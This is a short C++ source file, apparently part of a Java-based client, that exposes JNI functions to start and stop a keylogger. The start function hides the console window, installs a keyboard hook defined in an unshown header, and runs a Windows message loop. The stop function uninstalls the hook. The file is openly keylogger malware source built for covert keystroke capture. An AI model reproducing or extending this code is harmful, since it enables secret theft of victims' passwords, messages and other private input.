#include <windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include "KeybHook.h"
#include "Client_Keylogger_Keylogger.h"
bool continueLoop = true;
JNIEXPORT void JNICALL Java_Client_Keylogger_Keylogger_startKey(JNIEnv *env, jobject thisObj)
{
    // open output file in append mode

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    InstallHook();

    /*
    * Windows uses the MSG sructure to pass many kinds of things to your program
    * including keys, mouse moverment, clicks, changes made to your window etc.
    * The use of parameter is different for different messages, so for details
    * you should look up a specific message.
    */
    /* 
    * https://docs.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-msg
    */
    MSG Msg;

    while ((GetMessage(&Msg, NULL, 0, 0)) && (continueLoop))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
}

JNIEXPORT void JNICALL Java_Client_Keylogger_Keylogger_stopKey(JNIEnv *env, jobject thisObj)
{
    UninstallHook();
    continueLoop = false;
}
